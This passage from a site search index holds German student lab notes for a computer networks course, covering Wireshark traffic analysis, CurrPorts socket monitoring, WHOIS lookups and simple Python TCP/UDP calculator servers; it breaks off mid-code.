sollte der Stream-Traffic sein und Blau die allgemeine Up und Downstreams f\u00fcr SSL Pakete </p> <p>Jetzt sehen wir deutlich wie eine \u00dcberlagerung der beiden Filter stattfindet und dass wir in regelm\u00e4\u00dfigen abst\u00e4nden gro\u00dfe Pakete empfangen und senden.</p> <p>Alle 2sek ein peek mit 22 - 25 Packets</p> <p>Unter: - Men\u00fc: \"Statistiken\" \u2192 \"Gespr\u00e4che\" (Conversations) \u2192 TCP-Tab k\u00f6nnen wir noch Bandbreite analysieren </p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#download-empfangen","title":"\ud83d\udd39 Download (empfangen):","text":"<ul> <li>334\u202fkB = 334\u202f\u00d7\u202f1024\u202f\u00d7\u202f8 = 2.731.008 Bits</li> <li>Zeit: 19,6283 Sekunden  \\(\\(\\frac{2.731.008 \\text{ Bit}}{19,6283 \\text{ Sek}} \\approx \\mathbf{139.2 \\text{ kbps}}\\)\\)</li> </ul>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/1.%20Wireshark%20-%20Introduction/#upload-gesendet","title":"\ud83d\udd39 Upload (gesendet):","text":"<ul> <li>7\u202fkB = 7\u202f\u00d7\u202f1024\u202f\u00d7\u202f8 = 57.344 Bits</li> <li>Zeit: 19,6283 Sekunden \\(\\(\\frac{57.344 \\text{ Bit}}{19,6283 \\text{ Sek}} \\approx \\mathbf{2.9 \\text{ kbps}}\\)\\)</li> </ul> <p>Wenn man den Stream noch etwas l\u00e4nger laufen l\u00e4sst, sieht es in etwa so aus:</p> <p></p> <p>Beim Aufzeichnen eines HTTPS-basierten Streams zeigte der Netzwerkverkehr typische Pufferungs-Muster. Der Client fordert regelm\u00e4\u00dfig gr\u00f6\u00dfere Datenmengen an, was sich in deutlich sichtbaren Paket-Bursts \u00e4u\u00dfert (\u00fcber 1.000 Pakete/Sekunde), gefolgt von Pausen.  Der Datenverkehr lief vollst\u00e4ndig \u00fcber TCP-Port 443 (HTTPS). Es wurden keine UDP-Streams verwendet.  Die \u00dcbertragung war \u00fcberwiegend stabil, mit nur wenigen TCP-Fehlern, die keine gr\u00f6\u00dfere St\u00f6rung darstellten. Insgesamt l\u00e4sst sich eine regelm\u00e4\u00dfige Paket\u00fcbertragung in der ersten H\u00e4lfte feststellen, mit zunehmender Unregelm\u00e4\u00dfigkeit in der zweiten H\u00e4lfte, was auf unterschiedliche Pufferanforderungen oder parallele Hintergrundaktivit\u00e4t hindeuten k\u00f6nnte.</p>","tags":["Course/","Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/","title":"2. Socket Monitoring","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#2-monitoring-von-sockets","title":"2 Monitoring von Sockets","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#21-wie-viele-sockets-sind-insgesamt-geoffnet","title":"2.1) Wie viele Sockets sind insgesamt ge\u00f6ffnet?","text":"<ul> <li>100 total Ports    </li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#22-wie-unterscheiden-sich-die-eintrage-von-tcp-und-udp-sockets","title":"2.2) Wie unterscheiden sich die Eintr\u00e4ge von TCP und UDP Sockets?","text":"Merkmal TCP UDP Verbindung Ja (Handshake) Nein Geschwindigkeit Langsamer, aber sicher Schneller, aber unsicher Garantie Reihenfolge + Fehlerfreiheit Keine Garantie State sichtbar? Ja (LISTENING, ESTABLISHED usw.) Nein (kein Verbindungsstatus) Beispiel Webseiten, Emails, SSH, FTP Online-Spiele, Streaming, DNS #### 2.3) Was bedeutet die Spalte \u201eState\u201c bei TCP Sockets? <ul> <li>LISTENING: Socket wartet auf eingehende Verbindungen.</li> <li>ESTABLISHED: Verbindung ist aktiv und Daten flie\u00dfen.</li> <li>TIMEWAIT: Verbindung wurde beendet, wartet noch auf vollst\u00e4ndige Schlie\u00dfung.</li> <li>CLOSEWAIT: Andere Seite hat Verbindung beendet, aber eigene Seite noch nicht.</li> <li>SYNSENT / SYNRECEIVED: Verbindungsaufbau im Gange.</li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#24-wie-viele-server-ports-hat-ihr-rechner-geoffnet-statelistening","title":"2.4) Wie viele Server Ports hat Ihr Rechner ge\u00f6ffnet (state=Listening)?","text":"<ul> <li>Filter in CurrPorts auf <code>State = Listening</code> setzen.</li> <li>Nur die Eintr\u00e4ge z\u00e4hlen, wo \"Listening\" steht.</li> <li>37 Listening sockets. 82 total ports (TCP-Listening, UDP)</li> </ul>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#25-wie-viele-sockets-established-werden-neu-geoffnet-wenn-sie-die-messung-nach-einer-minute-erneut-durchfuhren-bzw-die-ergebnisse-aktualisieren","title":"2.5) Wie viele Sockets (ESTABLISHED) werden neu ge\u00f6ffnet, wenn Sie die Messung nach einer Minute erneut durchf\u00fchren bzw. die Ergebnisse aktualisieren?","text":"<ol> <li>Verbindungen Filtern, ausw\u00e4hlen und speichern</li> <li>Messungen vergleichen</li> </ol> <p>Erste Messung</p> Prozessname PID Protokoll Lokaler Port Lokale IP Remote Port Remote IP Remote Hostname Status svchost.exe 3300 TCP 59265 192.168.178.48 443 172.211.123.249 Established NortonSvc.exe 3880 TCP 27196 192.168.178.48 443 23.48.23.63 a23-48-23-63.deploy.static.akamaitechnologies.com Established NortonSvc.exe 3880 TCP 49112 192.168.178.48 443 34.73.71.173 173.71.73.34.bc.googleusercontent.com Established nllToolsSvc.exe 4052 TCP 6746 192.168.178.48 443 13.83.93.5 Established nllToolsSvc.exe 4052 TCP 27121 192.168.178.48 443 13.83.93.5 Established chrome.exe 12760 TCP 6737 192.168.178.48 5228 64.233.167.188 wl-in-f188.1e100.net Established chrome.exe 12760 TCP 27145 192.168.178.48 443 162.159.138.234 Established chrome.exe 12760 TCP 27178 192.168.178.48 443 104.18.30.192 Established chrome.exe 12760 TCP 27181 192.168.178.48 443 104.18.13.178 Established chrome.exe 12760 TCP 27186 192.168.178.48 443 34.36.71.237 237.71.36.34.bc.googleusercontent.com Established chrome.exe 12760 TCP 27187 192.168.178.48 443 34.160.67.133 133.67.160.34.bc.googleusercontent.com Established chrome.exe 12760 TCP 27194 192.168.178.48 443 23.50.131.29 a23-50-131-29.deploy.static.akamaitechnologies.com Established chrome.exe 12760 TCP 27195 192.168.178.48 443 104.18.32.47 Established chrome.exe 12760 TCP 27197 192.168.178.48 443 23.50.131.29 a23-50-131-29.deploy.static.akamaitechnologies.com Established chrome.exe 12760 TCP 27198 192.168.178.48 443 172.64.155.209 Established chrome.exe 12760 TCP 57480 192.168.178.48 443 162.159.135.234 Established chrome.exe 12760 TCP 57495 192.168.178.48 443 35.186.224.45 45.224.186.35.bc.googleusercontent.com Established <p>zweite Messung</p> Prozessname PID Protokoll Lokaler Port Lokale IP Remote Port Remote IP Remote Hostname Status svchost.exe 3300 TCP 59265 192.168.178.48 443 172.211.123.249 Established NortonSvc.exe 3880 TCP 49112 192.168.178.48 443 34.73.71.173 173.71.73.34.bc.googleusercontent.com Established nllToolsSvc.exe 4052 TCP 6746 192.168.178.48 443 13.83.93.5 Established nllToolsSvc.exe 4052 TCP 27121 192.168.178.48 443 13.83.93.5 Established chrome.exe 12760 TCP 6737 192.168.178.48 5228 64.233.167.188 wl-in-f188.1e100.net Established chrome.exe 12760 TCP 27145 192.168.178.48 443 162.159.138.234 Established chrome.exe 12760 TCP 27195 192.168.178.48 443 104.18.32.47 Established chrome.exe 12760 TCP 27198 192.168.178.48 443 172.64.155.209 Established chrome.exe 12760 TCP 57480 192.168.178.48 443 162.159.135.234 Established chrome.exe 12760 TCP 57495 192.168.178.48 443 35.186.224.45 45.224.186.35.bc.googleusercontent.com Established NortonSvc.exe 3880 TCP 27201 192.168.178.48 443 2.16.168.103 a2-16-168-103.deploy.static.akamaitechnologies.com Established <p>Ergebnis</p> Typ Prozessname Lokaler Port Remote-IP Remote-Hostname Bemerkung Fehlt NortonSvc.exe 27196 23.48.23.63 a23-48-23-63.deploy.static.akamaitechnologies.com Verbindung geschlossen Fehlt chrome.exe 27178 104.18.30.192 Verbindung geschlossen Fehlt chrome.exe 27181 104.18.13.178 Verbindung geschlossen Fehlt chrome.exe 27186 34.36.71.237 237.71.36.34.bc.googleusercontent.com Verbindung geschlossen Fehlt chrome.exe 27187 34.160.67.133 133.67.160.34.bc.googleusercontent.com Verbindung geschlossen Fehlt chrome.exe 27194 23.50.131.29 a23-50-131-29.deploy.static.akamaitechnologies.com Verbindung geschlossen Fehlt chrome.exe 27197 23.50.131.29 a23-50-131-29.deploy.static.akamaitechnologies.com Verbindung geschlossen Neu NortonSvc.exe 27201 2.16.168.103 a2-16-168-103.deploy.static.akamaitechnologies.com Neue Verbindung aufgebaut","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#26-sehen-sie-zahlreiche-sockets-mit-ip-adresse-127001-finden-sie-heraus-wofur-diese-ip-adresse-benutzt-wird-und-blenden-sie-alle-sockets-mit-dieser-adresse-aus","title":"2.6) Sehen Sie zahlreiche Sockets mit IP-Adresse 127.0.0.1? Finden Sie heraus, wof\u00fcr diese IP Adresse benutzt wird und blenden Sie alle Sockets mit dieser Adresse aus.","text":"<p>127.0.0.1 ist die sogenannte Loopback-Adresse, das bedeutet, dass dein eigener Computer redet mit sich selbst, also eine Netzwerkverbindung innerhalb deines Rechners.</p> <p>Viele Programme brauchen eine M\u00f6glichkeit, intern Daten auszutauschen, zum Beispiel: - Ein Webbrowser (z.B. Chrome, Firefox) benutzt 127.0.0.1, wenn Plugins oder Erweiterungen lokal kommunizieren. - Entwicklungsumgebungen wie Visual Studio, XAMPP oder Docker verwenden 127.0.0.1, um Server und Datenbanken lokal zu betreiben (z.B. ein Webserver wie Apache l\u00e4uft lokal). - Sicherheitssoftware (wie Antivirenprogramme) k\u00f6nnte sich selbst \u00fcber 127.0.0.1 \u00fcberwachen. - Spiele oder Apps, die lokale APIs benutzen (z.B. Discord Overlay f\u00fcr Spiele).</p> <p>Beispiel:</p> <ul> <li>Man startet einen kleinen lokalen Webserver (z.B. <code>http://127.0.0.1:8080/</code>), um eine Webseite zu testen, aber niemand aus dem Internet kann auf diese Webseite zugreifen.</li> </ul> <p>Um diese Socketsauszublenden,gehst du so vor: - Men\u00fc -&gt;Options -&gt; Advanced Filter - Trage dort ein:     <code>exclude:both:tcpudp:127.0.0.1</code></p> <p>Die ganze 127.0.0.0/8 IP-Range (also von 127.0.0.0 bis 127.255.255.255) ist reserviert f\u00fcr Loopback. Aber fast immer wird einfach 127.0.0.1 genutzt.</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#27-bestimmen-sie-anhand-der-portnummer-und-der-portliste-fur-einige-interessanteunbekannte-prozesse-mit-welchem-protokoll-diese-kommunizieren","title":"2.7) Bestimmen Sie anhand der Portnummer und der Portliste f\u00fcr einige interessante/unbekannte Prozesse, mit welchem Protokoll diese kommunizieren.","text":"<ul> <li>Bei der Bestimmung des Dienstes und Protokolls ist ausschlie\u00dflich der Remote Port relevant, da der lokale Port vom Betriebssystem dynamisch vergeben wird und keine Zuordnung zu einem festen Protokoll hat.</li> </ul> Prozessname Lokaler Port Remote Port Zieladresse Dienst / Protokoll laut Portliste Bemerkung svchost.exe 59265 443 172.211.123.249 HTTPS (TCP) Verschl\u00fcsselte Webkommunikation NortonSvc.exe 27196 443 23.48.23.63 (a23-48-23-63.deploy.static.akamaitechnologies.com) HTTPS (TCP) Verbindung zu Cloud-Servern (Updates) NortonSvc.exe 49112 443 34.73.71.173 (173.71.73.34.bc.googleusercontent.com) HTTPS (TCP) Vermutlich Google Cloud-Server nllToolsSvc.exe 6746 443 13.83.93.5 HTTPS (TCP) Microsoft Azure Cloud-Server (vermutlich) nllToolsSvc.exe 27121 443 13.83.93.5 HTTPS (TCP) Microsoft Azure Cloud-Server (vermutlich) chrome.exe 6737 5228 64.233.167.188 (wl-in-f188.1e100.net) Android Cloud Messaging (Google Services TCP) Verbindungen zu Google-Diensten (Push) chrome.exe 27145 443 162.159.138.234 HTTPS (TCP) Webseitenbesuch oder Hintergrunddienste chrome.exe 57480 443 162.159.135.234 HTTPS (TCP) Webseitenbesuch oder Hintergrunddienste NortonSvc.exe 27201 443 2.16.168.103 (a2-16-168-103.deploy.static.akamaitechnologies.com) HTTPS (TCP) neue Verbindung zu Akamai-Server","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#3-details-uber-die-kommunikationspartner-ihres-pcs","title":"3 Details \u00fcber die Kommunikationspartner ihres PCs","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#1-finden-sie-uber-wireshark-heraus-wie-das-programm-ipnetinfo-die-informationen-erhalt-welcher-server-wird-kontaktiert-welches-protokoll-wird-verwendet","title":"1) Finden Sie \u00fcber WireShark heraus, wie das Programm \u201eIPnetInfo\u201c die Informationen erh\u00e4lt. Welcher Server wird kontaktiert? Welches Protokoll wird verwendet?","text":"<p>Wir haben zuerst in CurrPorts ein Programm mit externer IP-Adresse markiert  und mit IPNetInfo abgefragt W\u00e4hrenddessen lief Wireshark im Hintergrund. Um gezielt den Datenverkehr von IPNetInfo zu beobachten, haben wir im Filterfeld den Begriff <code>whois</code> verwendet. Daraufhin bekamen wir folgendes Ergebnis  wo sichtbar wird, dass unser PC (192.168.0.105) eine Anfrage an den Server 199.71.0.46 gesendet hat. Das verwendete Protokoll ist <code>WHOIS</code> \u00fcber TCP Port 43 </p> <p></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#2-im-welchem-netz-befindet-sich-der-web-server-der-in-der-ersten-wireshark-aufgabe-aufgerufenen-web-seite","title":"2) Im welchem Netz befindet sich der Web-Server, der in der ersten WireShark-Aufgabe aufgerufenen Web-Seite?","text":"<p>In der WHOIS-Antwort konnten wir die Informationen zum Ziel-Server auslesen. Der IP-Bereich 162.158.0.0/15 geh\u00f6rt zur Firma Cloudflare, Inc. mit Sitz in Kalifornien, USA. Das Netz tr\u00e4gt den Namen CLOUDFLARENET und ist direkt von ARIN vergeben worden. Weitere Infos wie die Organisation (AS13335), Registrierungs- und Aktualisierungsdaten sowie Hinweise zur Abuse-Meldung waren ebenfalls enthalten.</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#3-welche-informationen-finden-sie-uber-die-htwg","title":"3) Welche Informationen finden Sie \u00fcber die HTWG?","text":"<p>Erstens, www.htwg-konstanz.de pingen: </p><pre><code>PS C:\\Users\\mohsa\\Github\\Quartz&gt; ping www.htwg-konstanz.de\n\nPinging cms.htwg-konstanz.de [141.37.20.31] with 32 bytes of data:\nReply from 141.37.20.31: bytes=32 time=1ms TTL=59\nReply from 141.37.20.31: bytes=32 time=1ms TTL=59\nReply from 141.37.20.31: bytes=32 time=1ms TTL=59\nReply from 141.37.20.31: bytes=32 time=1ms TTL=59\n\nPing statistics for 141.37.20.31:\n    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),\nApproximate round trip times in milli-seconds:\n    Minimum = 1ms, Maximum = 1ms, Average = 1ms\n</code></pre> Die IP-Adresse ist 141.37.20.31<p></p> <p>```txt title=\"In IPNetInfo 141.37.20.31 eingegeben\" {28-42} % This is the RIPE Database query service. % The objects are in RPSL format. % % The RIPE Database is subject to Terms and Conditions. % See https://docs.db.ripe.net/terms-conditions.html</p> <p>% Information related to '141.37.0.0 - 141.37.255.255'</p> <p>% Abuse contact for '141.37.0.0 - 141.37.255.255' is 'abuse@htwg-konstanz.de'</p> <p>inetnum:        141.37.0.0 - 141.37.255.255 netname:        FH-KN country:        DE admin-c:        HKTW1-RIPE tech-c:         HKTW1-RIPE org:            ORG-HKTW1-RIPE status:         LEGACY remarks:        ******* remarks:        * DEFAULT ABUSE CONTACT: abuse@htwg-konstanz.de  * remarks:        ******* mnt-by:         BELWUE-MNT mnt-by:         RIPE-NCC-LEGACY-MNT created:        2002-04-25T09:54:38Z last-modified:  2016-04-14T08:23:18Z source:         RIPE sponsoring-org: ORG-BA9-RIPE</p> <p>organisation:   ORG-HKTW1-RIPE org-name:       Hochschule Konstanz Technik, Wirtschaft und Gestaltung country:        DE org-type:       OTHER address:        Brauneggerstr. 55 address:        78462 Konstanz, Germany e-mail:         netzwerk@htwg-konstanz.de admin-c:        HKTW1-RIPE tech-c:         HKTW1-RIPE abuse-c:        HKTW1-RIPE mnt-ref:        BELWUE-MNT mnt-by:         BELWUE-MNT created:        2015-06-17T14:46:25Z last-modified:  2022-12-01T17:31:18Z source:         RIPE</p> <p>role:           Hochschule Konstanz Technik, Wirtschaft und Gestaltung address:        Brauneggerstr. 55 address:        78462 Konstanz, Germany e-mail:         netzwerk@htwg-konstanz.de admin-c:        MS3208-RIPE tech-c:         MS3208-RIPE nic-hdl:        HKTW1-RIPE abuse-mailbox:  abuse@htwg-konstanz.de mnt-by:         BELWUE-MNT created:        2015-06-17T14:46:25Z last-modified:  2015-06-18T11:34:36Z source:         RIPE</p> <p>% Information related to '141.37.0.0/16AS553'</p> <p>route:          141.37.0.0/16 descr:          FH-KONSTANZ origin:         AS553 mnt-by:         BELWUE-MNT created:        1970-01-01T00:00:00Z last-modified:  2001-09-22T09:32:38Z source:         RIPE</p> <p>% This query was served by the RIPE Database Query Service version 1.117 (ABERDEEN) </p><pre><code>---\n## 4 Sockets beim Laden einer Web-Seite\n\n#### 1) Bestimmen Sie die Anzahl Sockets, die ge\u00f6ffnet werden, wenn Sie www.spiegel.de herunterladen. a) Wenn es Sie interessiert: vergleichen Sie die Anzahl der Sockets mit und ohne Ad-Blocker\n\nWir haben in CurrPorts alle aktiven Verbindungen gefiltert, die vom Browserprozess `chrome.exe` ge\u00f6ffnet wurden. Dabei haben wir jeweils nach dem Laden von Spiegel, die Anzahl der aktiven Sockets gez\u00e4hlt einmal mit und einmal ohne Adblocker.\n\n- Ohne Adblocker wurden **45 Sockets** ge\u00f6ffnet.\n![SS-Currports-2.png](&lt;../../../images/SS-Currports-2.png&gt;)\n- Mit aktiviertem Adblocker waren es nur **23 Sockets**.\n![SS-Currports-3.png](&lt;../../../images/SS-Currports-3.png&gt;)\n-&gt; Der Vergleich zeigt, dass der Einsatz eines Adblockers die Anzahl der ge\u00f6ffneten Verbindungen deutlich reduziert, da viele externe Inhalte z.\u202fB. Werbung, Tracking, Analytics nicht geladen werden.\n\n#### 2) Was ist die maximale Anzahl von Sockets pro Remote-IP-Adresse?\nDie Anzahl der Sockets pro Remote-IP-Adresse ist nicht begrenzt, solange gen\u00fcgend Ports verf\u00fcgbar sind und die Server-Software die Verbindungen verarbeiten kann.\n\nEin Socket ist technisch definiert als Kombination aus lokaler IP-Adresse, lokalem Port, Remote-IP-Adresse und Remote-Port.  \nAuf Client-Seite stehen daf\u00fcr **bis zu 65.536 Ports** zur Verf\u00fcgung (durch die 16-Bit-Portnummern). Das bedeutet, dass ein Client theoretisch bis zu 65.536 gleichzeitige Verbindungen zu einer einzigen Remote-IP-Adresse aufbauen kann, sofern jede Verbindung einen anderen lokalen Port verwendet.\n\nIn der Praxis ist die maximale Anzahl jedoch durch mehrere Faktoren eingeschr\u00e4nkt:\n\n- **Windows-Betriebssystem**:  \n    Standardm\u00e4\u00dfig ist der Bereich f\u00fcr dynamische (ephemere) Ports auf z.\u202fB. **49152-65535** beschr\u00e4nkt, also etwa **16.384 Ports**.  \n    Dieses Limit l\u00e4sst sich mit dem Befehl\n\n```powershell\nnetsh int ipv4 set dynamicport tcp start=1025 num=64510\n</code></pre><p></p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#3-welche-remote-ports-werden-verwendet","title":"3) Welche Remote-Ports werden verwendet?","text":"<p>Beim Zugriff auf Spiegel f\u00e4llt auf, dass haupts\u00e4chlich der Port 443 verwendet wird. Das ist sinnvoll, da dieser Port standardm\u00e4\u00dfig f\u00fcr das HTTPS-Protokoll reserviert ist, welches heute bei nahezu allen Webseiten zur verschl\u00fcsselten Kommunikation eingesetzt wird.</p> <p>In CurrPorts oder Wireshark ist erkennbar, dass fast alle Verbindungen zu externen Servern den Remote-Port 443 nutzen. Weitere Ports (z.\u202fB. 80 f\u00fcr HTTP) kommen kaum noch vor, da moderne Webseiten standardm\u00e4\u00dfig HTTPS erzwingen.</p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#4-wie-viele-verschiedenen-firmen-konnen-sie-die-remote-hosts-zuordnen-am-besten-uber-contact-name-in-ipnetinfo","title":"4) Wie viele verschiedenen Firmen k\u00f6nnen Sie die Remote-Hosts zuordnen (am Besten \u00fcber Contact Name in IPNetInfo)?","text":"IP Address Contact Name 63.140.62.120 Adobe Inc. 63.140.62.210 Adobe Inc. 104.109.250.19 Akamai International, BV 108.128.223.16 Amazon Data Services Ireland Limited 54.76.180.38 Amazon Technologies Inc. 3.160.150.48 Amazon.com, Inc. 178.250.1.11 Criteo Network Operations Center 178.250.1.38 Criteo Network Operations Center 35.210.58.154 Google LLC 64.233.184.188 Google LLC 142.250.180.99 Google LLC 128.65.210.183 Link11 GmbH Hostmaster 150.171.27.10 Microsoft Corporation 150.171.30.10 Microsoft Corporation 80.67.82.90 Network Architecture Role Account","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#5-laden-sie-eine-andere-populare-web-seite-und-vergleichen-sie-die-liste-der-kontaktierten-firmen","title":"5) Laden Sie eine andere popul\u00e4re Web-Seite und vergleichen Sie die Liste der kontaktierten Firmen.","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/2.%20Socket%20-%20monitoring/#beispiel-zeitde","title":"Beispiel Zeit.de:","text":"IP Address Contact Name 52.222.236.101 Amazon.com, Inc. 151.101.1.55 Fastly, Inc. 151.101.129.55 Fastly, Inc. 35.246.185.66 Google LLC 64.233.184.188 Google LLC 185.54.150.140 Grigori Karlik 167.235.124.61 Hetzner Online GmbH - Contact Role","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/","title":"3. Socket Programmierung","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#2-socket-programmierung","title":"2. Socket Programmierung","text":"","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#2-fuhren-sie-dazu-das-skript-aus-der-theorieaufgabe-im-debug-modus-oder-zeilenweise-in-der-windows-kommandozeile-zweimal-mit-den-angegebenen-parametern-aus-und-verfolgen-sie-die-kommunikation-mit-wireshark-sowie-die-geoffneten-ports-mit-currports","title":"2.) F\u00fchren Sie dazu das Skript aus der Theorieaufgabe im Debug-Modus oder zeilenweise in der Windows-Kommandozeile zweimal mit den angegebenen Parametern aus und verfolgen Sie die Kommunikation mit WireShark sowie die ge\u00f6ffneten Ports mit CurrPorts","text":"<p>Currports: </p> <p>Wireshark: </p>","tags":["Rechnernetze","Semester-5","Informatik"]},{"location":"studium/Rechnernetze/Praktisch/3.%20Socket%20-%20Programmierung/#3-socket-programmierung-rechenserver","title":"3. Socket Programmierung - Rechenserver","text":"Teil Typ Beschreibung ID Unsigned Int (4 Bytes) Einzigartige Aufgaben-ID Operation UTF-8 kodiert (z.\u202fB. \"SUM\") \"SUM\", \"PRO\", \"MIN\", \"MAX\" N Unsigned Char (1 Byte) Anzahl der folgenden Zahlen z1...zN Signed Ints (4 Bytes je Zahl) Die eigentlichen Zahlen Der Server antwortet mit: Teil Typ Beschreibung ID Unsigned Int (4 Bytes) Die gleiche Aufgaben-ID Ergebnis Signed Int (4 Bytes) Das Ergebnis der Berechnung Format Meaning Bytes Python Type !I Unsigned int (big-endian) 4 For ID !i Signed int (big-endian) 4 For each number !B Unsigned char (big-endian) 1 For N (number of values) !Ii Combination: Unsigned int + int 8 For server response: (ID, result) Rechenserver_tcpRechenserver-Client_tcpRechenserver-udpRechenserver-Client_udp <pre><code># rechenserver_tcp.py\nimport socket\nimport struct\nimport time\n\n# Konfiguration\nHOST = '127.0.0.1'\nPORT = 50000\nTIMEOUT = 5  # Sekunden\nSERVER_ACTIVITY_PERIOD = 30  # Sekunden\n\ndef berechne(op, zahlen):\n    if op == \"SUM\":\n        return sum(zahlen)\n    elif op == \"PRO\":\n        result = 1\n        for z in zahlen:\n            result *= z\n        return result\n    elif op == \"MIN\":\n        return min(zahlen)\n    elif op == \"MAX\":\n        return max(zahlen)\n    else:\n        return 0\n\n# Server starten\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.bind((HOST, PORT))\nsock.settimeout(TIMEOUT)\nsock.listen(1)\nprint(f\"[INFO] TCP Rechenserver l\u00e4uft auf {HOST}:{PORT}\")\n\nconn = None\nt_end = time.time() + SERVER_ACTIVITY_PERIOD\n\n# Auf eingehende Verbindung warten\nwhile time.time() &lt; t_end:\n    try:\n        conn, addr = sock.accept()\n        print('[INFO] Verbindung akzeptiert von:', addr)\n        break\n    except socket.timeout:\n        print('[TIMEOUT] Warten auf Verbindung...')\n\n# Wenn verbunden, Daten verarbeiten\nif conn:\n    while time.time() &lt; t_end:\n        try:\n            data = conn.recv(1024)\n            if not data:\n                print('[INFO] Verbindung wurde vom Client geschlossen.')\n                break\n\n            # Nachricht interpretieren\n            aufgabe_id = struct.unpack(\"!I\", data[0:4])[0]\n            operation = data[4:7].decode(\"utf-8\")\n            n = struct.unpack(\"!B\", data[7:8])[0]\n\n            zahlen = []\n            for i in range(n):\n                start = 8 + i * 4\n                zahl = struct.unpack(\"!i\", data[start:start+4])[0]\n                zahlen.append(zahl)\n\n            print(f\"[EMPFANGEN] ID: {aufgabe_id}, OP: {operation}, Zahlen: {zahlen}\")\n\n            result = berechne(operation, zahlen)\n            antwort = struct.pack(\"!Ii\", aufgabe_id, result)\n            conn.sendall(antwort)\n            print(f\"[GESENDET] Ergebnis: {result}\")\n\n        except socket.timeout:\n            print('[TIMEOUT] Warten auf Daten...')\n            continue\n\n    conn.close()\nsock.close()\nprint('[ENDE] Server beendet.')\n</code></pre> <pre><code># rechenclient_tcp.py\nimport socket\nimport struct\n\nHOST = '127.0.0.1'\nPORT = 50000\n\naufgabe_id = 1\noperation = \"SUM\"\nzahlen = [10, 20, 30]\n\n# Nachricht vorbereiten\nmsg = struct.pack(\"!I\", aufgabe_id)\nmsg += operation.encode(\"utf-8\")\nmsg += struct.pack(\"!B\", len(zahlen))\nfor z in zahlen:\n    msg += struct.pack(\"!i\", z)\n\n# Verbindung und Kommunikation\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:\n    client.connect((HOST, PORT))\n\n    client.sendall(msg)\n\n    antwort = client.recv(1024)\n    empfangene_id, ergebnis = struct.unpack(\"!Ii\", antwort)\n    print(f\"Antwort vom Server - ID: {empfangene_id}, Ergebnis: {ergebnis}\")\n</code></pre> <pre><code># rechenserver_udp.py\nimport socket\nimport struct\n\nHOST = '127.0.0.1'\nPORT = 50001\n\ndef berechne(op, zahlen):\n    if op == \"SUM\":\n        return sum(zahlen)\n    elif op == \"PRO\":\n        result = 1\n        for z in zahlen:\n            result *= z\n        return result\n    elif op == \"MIN\":\n        return min(zahlen)\n    elif op == \"MAX\":\n        return max(zahlen)\n    else:\n        return 0\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.bind((HOST, PORT))\nprint(f\"[INFO] UDP Rechenserver l\u00e4uft auf {HOST}:{PORT}\")\n\nwhile True:\n    data, addr = sock.recvfrom(1024)\n    aufgabe_id = struct.unpack(\"!I\", data[0:4])[0]\n    operation = data[4:7].decode(\"utf-8\")\n    n = struct.unpack(\"!B\", data[7:8])[0]\n    zahlen = [struct.unpack(\"!i\", data[8+i*4:12+i*4])[0] for i in range(n)]\n\n    print(f\"[EMPFANGEN] ID: {aufgabe_id}, OP: {operation}, Zahlen: {zahlen} von {addr}\")\n\n    result = berechne(operation, zahlen)\n    antwort = struct.pack(\"!Ii\", aufgabe_id, result)\n    sock.sendto(antwort, addr)\n</code></pre> <pre><code># rechenclient_udp.py\nimport socket\nimport struct\n\nHOST = '127.0.0.1'\nPORT = 50001\n\naufgabe_id = 2\noperation = \"MAX\"\nzahlen = [8, 22, -5, 13]\n\n# Nachricht vorbereiten\nmsg = struct.pack(\"!I\", aufgabe_id)\nmsg += operation.encode(\"utf-8\")\nmsg += struct.pack(\"!B\", len(zahlen))\nfor z in zahlen:\n    msg += struct.pack(\"!i\", z)\n\nwith socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client:\n    client.sendto(msg, (HOST, PORT))\n    antwort, _ = client.recvfrom(1024)\n\n    